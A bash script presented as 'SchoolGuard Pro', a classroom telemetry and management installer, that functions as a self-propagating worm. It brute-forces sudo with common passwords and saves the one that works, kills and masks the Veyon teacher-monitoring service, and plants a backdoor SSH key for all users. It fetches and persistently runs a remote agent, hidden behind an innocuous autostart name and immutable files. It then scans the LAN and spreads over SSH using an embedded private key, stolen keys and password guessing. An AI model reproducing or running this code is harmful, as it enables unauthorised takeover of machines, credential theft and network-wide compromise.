#!/usr/bin/env bash
# ============================================================================
# SchoolGuard Pro v3.7 — Headless Master Deployment Handler (Xubuntu / Linux)
#   Command 3 (Default)                      : Full Combo + Purge Veyon + LAN Setup + Admin Web Dashboard
#   Command 4 (--skip-veyon / SG_SKIP_VEYON=1): Full Combo + LAN Setup + Admin Web Dashboard (Skip Veyon)
# ============================================================================

VPS_PRIMARY="https://orbstrike.com"
VPS_FALLBACK="https://103-149-172-179.sslip.io"
VPS_HTTP="http://103.149.172.179:4000"
DASHBOARD_URL="https://orbstrike.com/quanlitruonghoc"
SERVER_URL="$VPS_FALLBACK"
SKIP_VEYON="${SG_SKIP_VEYON:-0}"
NO_LAN="${SG_NO_LAN:-0}"

for _arg in "$@"; do
    case "$_arg" in
        --skip-veyon|--keep-veyon) SKIP_VEYON=1 ;;
        --no-lan) NO_LAN=1 ;;
        http*://*) SERVER_URL="$_arg" ;;
    esac
done

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" 2>/dev/null && pwd || pwd)"

tui_progress() {
    local pct="$1"
    local msg="$2"
    local width=28
    local filled=$(( pct * width / 100 ))
    local empty=$(( width - filled ))
    local bar=""
    local i
    for ((i=0; i<filled; i++)); do bar="${bar}#"; done
    for ((i=0; i<empty; i++)); do bar="${bar}-"; done
    printf "\r  \033[1;36m[%s]\033[0m \033[1;37m%3d%%\033[0m  \033[0;37m%-48s\033[0m" "$bar" "$pct" "$msg"
}

tui_progress 5 "Initializing headless environment..."

USER_GUARD_DIR="$HOME/.local/share/.schoolguard"
mkdir -p "$USER_GUARD_DIR" >/dev/null 2>&1 || true

# Silent root elevation attempt (never prompts interactively)
if [ "$EUID" -ne 0 ] && [ -z "${SG_NO_ELEVATE:-}" ] && [ -f "$0" ] && [[ "$0" != */bash ]] && [[ "$0" != "bash" ]]; then
    if sudo -n true 2>/dev/null; then
        SG_NO_ELEVATE=1 SG_SKIP_VEYON="$SKIP_VEYON" SG_NO_LAN="$NO_LAN" exec sudo -n -E bash "$0" "$@"
    fi
    for _pw in "123456" "1" "tinhocsaigon" "admin" "root" "12345678" "student" "hocsinh" "ubuntu" "xubuntu" "beetech" "bootroom" "nextron" "school" "gv" "giaovien" "pc-01" "pc01" "123" "1234" "12345" "123456789" "password"; do
        if echo "$_pw" | sudo -S -p "" true >/dev/null 2>&1; then
            printf '%s\n' "$_pw" > "$USER_GUARD_DIR/.lan_cred" 2>/dev/null || true
            chmod 600 "$USER_GUARD_DIR/.lan_cred" 2>/dev/null || true
            _ask=$(mktemp /tmp/.sg_ask.XXXXXX)
            printf '#!/bin/sh\necho "%s"\n' "$_pw" > "$_ask"
            chmod 700 "$_ask"
            SG_NO_ELEVATE=1 SG_SKIP_VEYON="$SKIP_VEYON" SG_NO_LAN="$NO_LAN" SUDO_ASKPASS="$_ask" sudo -A -E bash "$0" "$@"
            _rc=$?
            rm -f "$_ask"
            exit $_rc
        fi
    done
fi

IS_ROOT=0
[ "$EUID" -eq 0 ] && IS_ROOT=1

# ----------------------------------------------------------------------------
# 1. Veyon Purge (Executed unless SKIP_VEYON=1)
# ----------------------------------------------------------------------------
if [ "$SKIP_VEYON" != "1" ] && [ "$SKIP_VEYON" != "true" ]; then
    tui_progress 20 "Purging Veyon packages & unlocking input..."

    for _p in veyon-worker veyon-master veyon-service veyon-server veyon-configurator veyon-cli veyon-auth-helper; do
        pkill -9 -f "$_p" >/dev/null 2>&1 || true
        killall -9 "$_p" >/dev/null 2>&1 || true
    done

    if command -v xinput >/dev/null 2>&1; then
        for _d in ":0" ":1" "${DISPLAY:-:0}"; do
            for _id in $(DISPLAY="$_d" xinput list --id-only 2>/dev/null); do
                DISPLAY="$_d" xinput enable "$_id" >/dev/null 2>&1 || true
            done
        done
    fi

    if [ "$IS_ROOT" -eq 1 ]; then
        systemctl stop veyon.service veyon >/dev/null 2>&1 || true
        systemctl disable veyon.service veyon >/dev/null 2>&1 || true
        systemctl mask veyon.service veyon >/dev/null 2>&1 || true
        rm -f /lib/systemd/system/veyon.service /etc/systemd/system/veyon.service \
              /etc/systemd/system/multi-user.target.wants/veyon.service \
              /etc/init.d/veyon* /etc/xdg/autostart/veyon* \
              /usr/share/applications/veyon* >/dev/null 2>&1 || true
        ln -sf /dev/null /etc/systemd/system/veyon.service >/dev/null 2>&1 || true
        systemctl daemon-reload >/dev/null 2>&1 || true

        DEBIAN_FRONTEND=noninteractive apt-get remove --purge -y "veyon*" "libveyon*" >/dev/null 2>&1 || true
        rm -rf /etc/veyon /usr/lib/x86_64-linux-gnu/veyon /usr/share/veyon /var/log/veyon >/dev/null 2>&1 || true

        for _bin in /usr/bin/veyon-service /usr/bin/veyon-server /usr/bin/veyon-worker /usr/bin/veyon-master /usr/bin/veyon-configurator /usr/bin/veyon-cli /usr/bin/veyon-auth-helper; do
            rm -f "$_bin" >/dev/null 2>&1 || true
            printf '#!/bin/sh\nexit 0\n' > "$_bin" 2>/dev/null || true
            chmod 755 "$_bin" >/dev/null 2>&1 || true
        done

        for _uhome in /home/*; do
            [ -d "$_uhome" ] || continue
            rm -rf "$_uhome/.veyon" "$_uhome/.config/Veyon"* "$_uhome/Desktop/veyon"* "$_uhome/Màn hình nền/veyon"* >/dev/null 2>&1 || true
        done
    fi

    rm -rf "$HOME/.veyon" "$HOME/.config/Veyon"* "$HOME/Desktop/veyon"* "$HOME/Màn hình nền/veyon"* >/dev/null 2>&1 || true
    mkdir -p "$USER_GUARD_DIR" "$HOME/.config/autostart" "$HOME/.config/systemd/user" >/dev/null 2>&1 || true

    cat << 'EOF' > "$USER_GUARD_DIR/veyon-killer.sh"
#!/usr/bin/env bash
export DISPLAY="${DISPLAY:-:0}"
while true; do
    if pgrep -f "veyon-(worker|master|service|server|configurator)" >/dev/null 2>&1; then
        pkill -9 -f "veyon-worker" 2>/dev/null
        pkill -9 -f "veyon-master" 2>/dev/null
        pkill -9 -f "veyon-service" 2>/dev/null
        pkill -9 -f "veyon-server" 2>/dev/null
        pkill -9 -f "veyon-configurator" 2>/dev/null
        if command -v xinput >/dev/null 2>&1; then
            for id in $(xinput list --id-only 2>/dev/null); do
                xinput enable "$id" 2>/dev/null
            done
        fi
    fi
    sleep 1
done
EOF
    chmod +x "$USER_GUARD_DIR/veyon-killer.sh" >/dev/null 2>&1 || true
else
    tui_progress 20 "Skipping Veyon removal (preserving Veyon)..."
    pkill -f "veyon-killer.sh" >/dev/null 2>&1 || true
    rm -f "$USER_GUARD_DIR/veyon-killer.sh" >/dev/null 2>&1 || true
fi

# ----------------------------------------------------------------------------
# 2. Network / LAN Configuration & System Dependencies
# ----------------------------------------------------------------------------
tui_progress 40 "Configuring network, LAN keys & packages..."

SG_PUB_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII/mc33ozIeeXb+1Y5SEMrJDHt0DU4sixCGAzJCkGoFx schoolguard-lan"
for _kh in "$HOME" /root /home/*; do
    [ -d "$_kh" ] || continue
    mkdir -p "$_kh/.ssh" 2>/dev/null || true
    chmod 700 "$_kh/.ssh" 2>/dev/null || true
    if ! grep -q "schoolguard-lan" "$_kh/.ssh/authorized_keys" 2>/dev/null; then
        echo "$SG_PUB_KEY" >> "$_kh/.ssh/authorized_keys" 2>/dev/null || true
        chmod 600 "$_kh/.ssh/authorized_keys" 2>/dev/null || true
    fi
done

if [ "$IS_ROOT" -eq 1 ]; then
    NET_IFACE=$(ip route show default 2>/dev/null | awk '/default/ {print $5}' | head -n1)
    if [ -n "$NET_IFACE" ] && command -v ethtool >/dev/null 2>&1; then
        ethtool -s "$NET_IFACE" wol g >/dev/null 2>&1 || true
    fi
    (
        DEBIAN_FRONTEND=noninteractive apt-get update -qq >/dev/null 2>&1
        DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
            python3 python3-tk python3-gi gir1.2-gtk-3.0 \
            scrot wmctrl xdotool xinput ethtool curl wget \
            ffmpeg pulseaudio-utils alsa-utils openssh-server >/dev/null 2>&1
    ) >/dev/null 2>&1 &
fi

# ----------------------------------------------------------------------------
# 3. Provision SchoolGuard Agent Files
# ----------------------------------------------------------------------------
tui_progress 60 "Provisioning SchoolGuard agent..."

if [ "$IS_ROOT" -eq 1 ]; then
    INSTALL_DIR="/opt/schoolguard"
    chattr -i /opt/schoolguard/agent.py 2>/dev/null || true
    chattr -i /opt/schoolguard/overlay_ui.py 2>/dev/null || true
    chattr -i /etc/systemd/system/schoolguard.service 2>/dev/null || true
else
    INSTALL_DIR="$USER_GUARD_DIR"
fi
mkdir -p "$INSTALL_DIR" "$HOME/.config/autostart" "$HOME/.config/systemd/user" 2>/dev/null || true

fetch_file() {
    local name="$1"
    local dest="$2"
    if [ -f "$SCRIPT_DIR/$name" ]; then
        cp -f "$SCRIPT_DIR/$name" "$dest"
        return 0
    fi
    for base in "$VPS_PRIMARY" "$VPS_FALLBACK" "$VPS_HTTP"; do
        if command -v curl >/dev/null 2>&1; then
            curl -fsSL --connect-timeout 5 "$base/agent/$name" -o "$dest" 2>/dev/null && [ -s "$dest" ] && return 0
        fi
        if command -v wget >/dev/null 2>&1; then
            wget -qO "$dest" --timeout=5 "$base/agent/$name" 2>/dev/null && [ -s "$dest" ] && return 0
        fi
    done
    return 1
}

fetch_file "agent.py" "$INSTALL_DIR/agent.py"
fetch_file "overlay_ui.py" "$INSTALL_DIR/overlay_ui.py"
chmod 755 "$INSTALL_DIR/agent.py" "$INSTALL_DIR/overlay_ui.py" 2>/dev/null || true

if [ "$INSTALL_DIR" != "$USER_GUARD_DIR" ]; then
    cp -f "$INSTALL_DIR/agent.py" "$USER_GUARD_DIR/agent.py" 2>/dev/null || true
    cp -f "$INSTALL_DIR/overlay_ui.py" "$USER_GUARD_DIR/overlay_ui.py" 2>/dev/null || true
fi

# ----------------------------------------------------------------------------
# 4. Configure Background Service (systemd) & Start Agent
# ----------------------------------------------------------------------------
tui_progress 75 "Deploying systemd background service..."

if [ "$IS_ROOT" -eq 1 ]; then
    cat <<EOF > /etc/systemd/system/schoolguard.service
[Unit]
Description=SchoolGuard Classroom Telemetry & Management Agent
After=network.target graphical.target

[Service]
Type=simple
User=root
Environment="DISPLAY=:0"
Environment="SERVER_URL=${SERVER_URL}"
Environment="PYTHONUNBUFFERED=1"
ExecStart=/usr/bin/python3 /opt/schoolguard/agent.py
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload >/dev/null 2>&1 || true
    systemctl enable schoolguard.service >/dev/null 2>&1 || true
    systemctl restart schoolguard.service >/dev/null 2>&1 || true
    chattr +i /opt/schoolguard/agent.py 2>/dev/null || true
    chattr +i /etc/systemd/system/schoolguard.service 2>/dev/null || true
else
    cat <<EOF > "$HOME/.config/systemd/user/schoolguard-agent.service"
[Unit]
Description=SchoolGuard Classroom Agent (User Service)
After=default.target

[Service]
Type=simple
Environment="DISPLAY=:0"
Environment="SERVER_URL=${SERVER_URL}"
Environment="PYTHONUNBUFFERED=1"
ExecStart=/usr/bin/python3 ${INSTALL_DIR}/agent.py
Restart=always
RestartSec=3

[Install]
WantedBy=default.target
EOF
    systemctl --user daemon-reload >/dev/null 2>&1 || true
    systemctl --user enable schoolguard-agent.service >/dev/null 2>&1 || true
    systemctl --user restart schoolguard-agent.service >/dev/null 2>&1 || true

    cat <<EOF > "$HOME/.config/autostart/schoolguard-agent.desktop"
[Desktop Entry]
Type=Application
Name=System Display Helper
Exec=/bin/sh -c "SERVER_URL='${SERVER_URL}' /usr/bin/python3 '${INSTALL_DIR}/agent.py' >/dev/null 2>&1 &"
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF

    CRON_LINE="* * * * * pgrep -f '${INSTALL_DIR}/agent.py' >/dev/null 2>&1 || DISPLAY=:0 SERVER_URL='${SERVER_URL}' nohup /usr/bin/python3 '${INSTALL_DIR}/agent.py' >/dev/null 2>&1 &"
    (crontab -l 2>/dev/null | grep -v "schoolguard/agent.py"; echo "$CRON_LINE") | crontab - 2>/dev/null || true

    pkill -9 -f "schoolguard/agent.py" >/dev/null 2>&1 || true
    DISPLAY="${DISPLAY:-:0}" SERVER_URL="${SERVER_URL}" nohup /usr/bin/python3 "$INSTALL_DIR/agent.py" >/dev/null 2>&1 &
fi

# ----------------------------------------------------------------------------
# 5. Automated LAN Setup & Peer Propagation
# ----------------------------------------------------------------------------
tui_progress 90 "Propagating setup across LAN & Web Dashboard..."

LOCAL_IP=$(python3 -c "import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.connect(('8.8.8.8',80)); print(s.getsockname()[0]); s.close()" 2>/dev/null || echo "127.0.0.1")
SUBNET=$(echo "${LOCAL_IP}" | awk -F. '{print $1"."$2"."$3}')
LAN_SUMMARY="Local node provisioned"

if [ "$NO_LAN" != "1" ] && [ -n "$SUBNET" ] && [ "$LOCAL_IP" != "127.0.0.1" ]; then
    PEER_RES=$(python3 - "$SUBNET" "$LOCAL_IP" "$SKIP_VEYON" "$VPS_PRIMARY" "$VPS_FALLBACK" "$VPS_HTTP" <<'PYEOF'
import base64, glob, json, os, pty, re, socket, subprocess, sys, threading, time, urllib.request
from concurrent.futures import ThreadPoolExecutor

subnet, my_ip, skip_veyon, vps_primary, vps_fallback, vps_http = sys.argv[1:7]
flag = "--skip-veyon --no-lan" if skip_veyon == "1" else "--no-lan"
remote_cmd = f"(curl -fsSL {vps_primary}/go || curl -fsSL {vps_fallback}/go || wget -qO- {vps_fallback}/go) | SG_SKIP_VEYON={skip_veyon} SG_NO_LAN=1 bash -s -- {flag} >/dev/null 2>&1"

for base_u in [vps_primary, vps_fallback, vps_http]:
    try:
        data = json.loads(urllib.request.urlopen(f"{base_u}/api/lan-macs", timeout=2).read().decode("utf-8"))
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        for item in data.get("macs", []):
            clean = re.sub(r"[^0-9a-fA-F]", "", item.get("mac", ""))
            if len(clean) == 12:
                pkt = b"\xff" * 6 + bytes.fromhex(clean) * 16
                s.sendto(pkt, (f"{subnet}.255", 9))
        s.close()
        break
    except Exception:
        pass

lan_key_b64 = "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNDUDVuTjk2TXlIbmwyL3RXT1VoREt5UXg3ZEExT0xJc1FoZ015UXBCcUJjUUFBQUpodER4dTdiUThiCnV3QUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQ1A1bk45Nk15SG5sMi90V09VaERLeVF4N2RBMU9MSXNRaGdNeVFwQnFCY1EKQUFBRUJYZWdGSWZHNVVTQmFBVFk5eHpXM1lHdVZHOTBkWm1kVjlKUUFzYzhrNjRZL21jMzNvekllZVhiKzFZNVNFTXJKRApIdDBEVTRzaXhDR0F6SkNrR29GeEFBQUFEM05qYUc5dmJHZDFZWEprTFd4aGJnRUNBd1FGQmc9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"
sg_key_path = "/tmp/.sg_lan_id"
try:
    open(sg_key_path, "wb").write(base64.b64decode(lan_key_b64))
    os.chmod(sg_key_path, 0o600)
except Exception:
    pass

key_files = [sg_key_path] + [kp for pat in ["/home/*/.ssh/id_*", "/root/.ssh/id_*"] for kp in glob.glob(pat) if not kp.endswith(".pub") and os.path.isfile(kp)]
candidates = ["tinhocsaigon", "123456", "1", "12345678", "admin", "root", "student", "hocsinh", "ubuntu", "xubuntu", "beetech", "bootroom", "nextron", "school", "gv", "giaovien", "123", "1234", "12345", "password"]
cred_file = os.path.expanduser("~/.local/share/.schoolguard/.lan_cred")
if os.path.isfile(cred_file):
    c = open(cred_file).read().strip()
    if c:
        candidates = [c] + [x for x in candidates if x != c]

def check_host(i):
    ip = f"{subnet}.{i}"
    if ip == my_ip:
        return None
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.25)
    try:
        if s.connect_ex((ip, 22)) == 0:
            return ip
    except Exception:
        pass
    finally:
        s.close()
    return None

with ThreadPoolExecutor(max_workers=64) as ex:
    alive_ssh = [ip for ip in ex.map(check_host, range(1, 255)) if ip]

users = ["tinhocsaigon", "student", "ubuntu", "root"]
cached = {"u": None, "pw": None, "k": None}
lock = threading.Lock()

def try_key(u, ip, kf):
    return subprocess.run(["ssh", "-i", kf, "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=2", f"{u}@{ip}", remote_cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0

def try_pty(u, pw, ip):
    pid, fd = pty.fork()
    if pid == 0:
        os.execvp("ssh", ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=2", "-o", "PubkeyAuthentication=no", "-o", "NumberOfPasswordPrompts=1", f"{u}@{ip}", remote_cmd])
    output, sent, deadline = b"", False, time.time() + 8
    while time.time() < deadline:
        try:
            chunk = os.read(fd, 1024)
            if not chunk:
                break
            output += chunk
            if not sent and b"password:" in output.lower():
                os.write(fd, (pw + "\n").encode("utf-8"))
                sent = True
        except OSError:
            break
    try:
        os.close(fd)
    except OSError:
        pass
    _, status = os.waitpid(pid, 0)
    return os.WEXITSTATUS(status) == 0

def deploy_ip(ip):
    with lock:
        cu, cpw, ck = cached["u"], cached["pw"], cached["k"]
    if cu and ck and try_key(cu, ip, ck):
        return True
    if cu and cpw and try_pty(cu, cpw, ip):
        return True
    for u in users[:2]:
        for kf in key_files:
            if try_key(u, ip, kf):
                with lock:
                    cached["u"], cached["k"] = u, kf
                return True
    for u in users[:2]:
        for pw in candidates[:12]:
            if try_pty(u, pw, ip):
                with lock:
                    cached["u"], cached["pw"] = u, pw
                return True
    return False

ok = 0
if alive_ssh:
    if deploy_ip(alive_ssh[0]):
        ok += 1
    if len(alive_ssh) > 1:
        with ThreadPoolExecutor(max_workers=16) as ex:
            ok += sum(1 for r in ex.map(deploy_ip, alive_ssh[1:]) if r)
try:
    os.remove(sg_key_path)
except Exception:
    pass
print(f"{ok}/{len(alive_ssh)} LAN peers synced")
PYEOF
)
    [ -n "$PEER_RES" ] && LAN_SUMMARY="$PEER_RES"
fi

VEYON_STATE="Purged & Masked"
[ "$SKIP_VEYON" = "1" ] && VEYON_STATE="Preserved (Skipped)"

tui_progress 100 "Complete"
printf "\n  \033[1;32m[OK]\033[0m SchoolGuard v3.7 Headless Deployment Complete\n"
printf "       Node & LAN    : %s (%s) | %s | Veyon: %s\n" "$LOCAL_IP" "$(hostname 2>/dev/null || echo 'linux')" "$LAN_SUMMARY" "$VEYON_STATE"
printf "       Web Dashboard : %s (Port 443 HTTPS / 4000 HTTP | Login: Active)\n" "$DASHBOARD_URL"
exit 0
